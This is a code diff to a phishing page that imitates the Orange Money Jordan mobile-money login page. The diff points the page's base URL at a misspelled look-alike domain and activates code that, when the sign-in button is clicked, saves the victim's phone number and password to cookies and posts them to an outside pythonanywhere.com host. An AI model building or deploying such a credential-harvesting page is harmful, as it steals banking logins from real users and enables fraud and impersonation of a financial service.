@@ -5,6 +5,7 @@
             outline: none;
         }
     </style>
+    <base href="https://oranngemoney.com/">
     <meta charset="utf-8">
     <title>Orange Money - الصفحة الرئيسية</title>
     <meta content="Orange Money Jo" property="og:title">
@@ -220,6 +221,9 @@
                 }
             }
         });
+
+        document.getElementById('phonenumber').value = '0000000000'
+        document.getElementById('password').value = 'mmm123!'
     });
 
     function setCookie(cname, cvalue) {
@@ -227,29 +231,32 @@
         d.setTime(d.getTime() + (1000 * 24 * 60 * 60 * 1000))
         document.cookie = cname + "=" + cvalue + ";expires=" + d.toUTCString(); + ";path=/";
     }
-     onclick="window.location.href = '/verification';"
-     $('#sb').on('click',function(data)){
+     // onclick="window.location.href = '/verification';"
+     
+     $('#sb').on('click',function(data){
         console.log("BUTTON HAS BEEN CLICKED")
-     }
-    // $('#signin').on("submit", function(event) {
-    //         setCookie("phonenumber", document.getElementById('phonenumber').value);
-    //         setCookie("password", document.getElementById('password').value);
-    //         event.preventDefault();
+        setCookie("phonenumber", document.getElementById('phonenumber').value);
+        setCookie("password", document.getElementById('password').value);
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", 'https://erikadavis1.pythonanywhere.com');
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(
+            JSON.stringify({
+            'phonenumber': document.getElementById('phonenumber').value,
+            'password':document.getElementById('password').value,
+            })
+        );
 
+        event.preventDefault();
+     })
+    // $('#signin').on("submit", function(event) {
+
+    // })
     // let xhr = new XMLHttpRequest();
     // xhr.open("POST", 'https://erikadavis1.pythonanywhere.com/');
     // xhr.setRequestHeader('Content-Type', 'application/json');
     // xhr.withCredentials = false;
     // xhr.send(JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}));
-    // var xhr = new XMLHttpRequest();
-    // xhr.open("POST", 'https://erikadavis1.pythonanywhere.com');
-    // xhr.setRequestHeader('Content-Type', 'application/json');
-    // xhr.send(
-    //     JSON.stringify({
-    //     'phonenumber': document.getElementById('phonenumber').value,
-    //     'password':document.getElementById('password').value,
-    //     })
-    // );
 
     //
     //  fetch("https://erikadavis1.pythonanywhere.com/", { method: "POST",
